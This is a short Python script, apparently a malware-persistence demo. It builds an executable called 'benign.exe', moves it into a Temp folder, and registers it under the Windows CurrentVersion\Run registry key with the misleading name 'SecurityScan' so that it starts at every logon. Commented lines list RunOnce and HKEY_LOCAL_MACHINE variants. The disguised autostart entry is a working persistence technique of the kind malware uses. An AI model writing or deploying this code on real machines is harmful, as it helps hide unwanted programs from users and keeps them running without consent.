import os
import shutil
import winreg

file_dir = os.path.join(os.getcwd(), "Temp")
file_name = "benign.exe"
file_path = os.path.join(file_dir, file_name)

# (with pathlib)
# from pathlib import Path
# file_dir = Path.cwd() / "Temp"
# file_name = "begnin.exe"
# file_path = file_dir / file_name

if os.path.isfile(file_path):
    os.remove(file_path)

# os.system("python BuildExe.py")
os.system("python ./BuildExe.py")

shutil.move(file_name, file_dir)

reg_hive = winreg.HKEY_CURRENT_USER  # Top Level keys are called "hives"
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
# reg_path = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
# # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
# reg_path = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

# reg_hive = winreg.HKEY_LOCAL_MACHINE
# # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
reg_path = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
# # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
# reg_path = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

key = winreg.OpenKey(reg_hive, reg_path, 0, access=winreg.KEY_WRITE)
winreg.SetValueEx(key, "SecurityScan", 0, winreg.REG_SZ, file_path)
